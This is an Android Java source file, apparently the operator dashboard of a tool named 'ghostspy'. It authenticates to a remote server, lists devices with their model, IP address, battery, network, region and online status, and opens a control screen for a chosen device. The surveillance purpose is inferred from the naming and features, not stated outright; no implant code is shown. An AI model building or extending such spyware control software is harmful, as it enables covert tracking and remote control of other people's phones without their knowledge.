package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private TextView statusText;
    private LinearLayout deviceContainer;
    private String token, email, role;
    private static final String SERVER = "https://ghostspy.bruang.biz.id";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);

        SharedPreferences prefs = getSharedPreferences("ghostspy", MODE_PRIVATE);
        token = prefs.getString("token", "");
        email = prefs.getString("email", "");
        role = prefs.getString("role", "");

        if (token.isEmpty()) {
            statusText.setText("❌ Tidak terautentikasi");
            return;
        }

        statusText.setText("⏳ Memuat perangkat...");
        fetchDevices();
    }

    private void fetchDevices() {
        new Thread(() -> {
            try {
                String urlStr = SERVER + "/api/devices";
                if (!role.equals("admin")) {
                    urlStr = SERVER + "/api/my-devices";
                }
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("Authorization", "Bearer " + token);
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                JSONArray devices = new JSONArray(sb.toString());
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("ip", ""),
                        d.optString("last_seen", ""),
                        d.optString("battery", "?"),
                        d.optString("network", "?"),
                        d.optString("region", "")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    if (list.isEmpty()) {
                        statusText.setText("📭 Tidak ada perangkat");
                        return;
                    }
                    for (String[] data : list) {
                        LinearLayout card = new LinearLayout(MainActivity.this);
                        card.setOrientation(LinearLayout.VERTICAL);
                        card.setBackground(getDrawable(R.drawable.card_admin));
                        card.setPadding(20, 20, 20, 20);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT,
                                LinearLayout.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0, 0, 0, 12);
                        card.setLayoutParams(lp);

                        LinearLayout topRow = new LinearLayout(MainActivity.this);
                        topRow.setOrientation(LinearLayout.HORIZONTAL);
                        topRow.setGravity(android.view.Gravity.CENTER_VERTICAL);

                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1]);
                        modelView.setTextColor(0xFFFFFFFF);
                        modelView.setTextSize(16);
                        modelView.setTypeface(null, android.graphics.Typeface.BOLD);
                        LinearLayout.LayoutParams modelParams = new LinearLayout.LayoutParams(
                                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                        modelView.setLayoutParams(modelParams);

                        boolean online = data[4].contains("now") || data[4].contains("Just");
                        TextView statusBadge = new TextView(MainActivity.this);
                        statusBadge.setText(online ? "ONLINE" : "OFFLINE");
                        statusBadge.setTextColor(online ? 0xFF00E676 : 0xFF9AA3B2);
                        statusBadge.setTextSize(11);
                        statusBadge.setBackgroundColor(0x22000000);
                        statusBadge.setPadding(8, 4, 8, 4);

                        topRow.addView(modelView);
                        topRow.addView(statusBadge);
                        card.addView(topRow);

                        TextView infoView = new TextView(MainActivity.this);
                        infoView.setText("ID: " + data[0] + " | Android " + data[2] + "\nIP: " + data[3] + " | Bat: " + data[5] + "% | " + data[7]);
                        infoView.setTextColor(0xFF9AA3B2);
                        infoView.setTextSize(12);
                        card.addView(infoView);

                        card.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
                            i.putExtra("deviceId", data[0]);
                            i.putExtra("deviceModel", data[1]);
                            i.putExtra("battery", data[5]);
                            i.putExtra("network", data[6]);
                            startActivity(i);
                        });

                        deviceContainer.addView(card);
                    }
                    statusText.setText("🟢 " + list.size() + " perangkat");
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Gagal memuat data"));
            }
        }).start();
    }
}
